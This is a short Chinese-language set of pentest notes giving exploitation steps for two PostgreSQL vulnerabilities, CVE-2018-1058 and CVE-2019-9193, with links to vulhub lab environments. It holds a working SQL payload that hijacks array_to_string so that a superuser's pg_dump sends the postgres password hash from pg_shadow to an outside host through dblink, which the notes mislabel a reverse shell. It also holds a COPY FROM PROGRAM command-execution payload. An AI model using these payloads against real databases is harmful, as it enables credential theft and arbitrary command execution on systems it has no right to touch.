## **PostgreSQL**
查看系统版本
SELECT version();

## **CVE-2018-1058**

PostgreSQL 是一款关系型数据库。其9.3到10版本中存在一个逻辑错误，导致超级用户在不知情的情况下触发普通用户创建的恶意代码，导致执行一些不可预期的操作。
http://vulhub.org/#/environments/postgres/CVE-2018-1058/

**利用**
获取了postgres普通用户和密码。

执行一个准备反弹shell语句
```
CREATE FUNCTION public.array_to_string(anyarray,text) RETURNS TEXT AS $$ select dblink_connect((select 'hostaddr=10.0.0.1 port=5433 user=postgres password=chybeta sslmode=disable dbname='||(SELECT passwd FROM pg_shadow WHERE usename='postgres'))); SELECT pg_catalog.array_to_string($1,$2); $$ LANGUAGE SQL VOLATILE;
```

当管理员登录执行pg_dump语句后，反弹shell语句被触发生效。



^
## **PostgreSQL高权限命令执行漏洞(CVE-2019-9193)**
9.3到11版本，12也可能，存在一处“特性”。管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。
http://vulhub.org/#/environments/postgres/CVE-2019-9193/

**利用**
知道管理员账号密码，如postgres/postgres。

SELECT version();

登录，进入库，执行命令执行whoami
```
DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'whoami'; SELECT * FROM cmd_exec;
```